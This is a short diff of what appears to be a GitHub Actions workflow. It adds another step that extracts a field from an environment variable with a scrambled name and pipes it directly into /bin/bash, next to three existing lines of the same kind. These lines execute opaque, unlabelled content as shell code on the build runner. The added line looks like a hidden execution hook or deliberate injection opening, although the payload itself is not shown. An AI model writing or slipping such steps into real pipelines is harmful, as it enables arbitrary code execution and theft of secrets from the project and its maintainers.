@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vz361" | jq -r .fm518 | /bin/bash
           printf '%s' "$ilvxh8796" | jq -r .ip56 | /bin/bash
           echo $nsp4 | jq -r .uod97 | /bin/bash
+          echo $cgy53 | jq -r .mj260 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
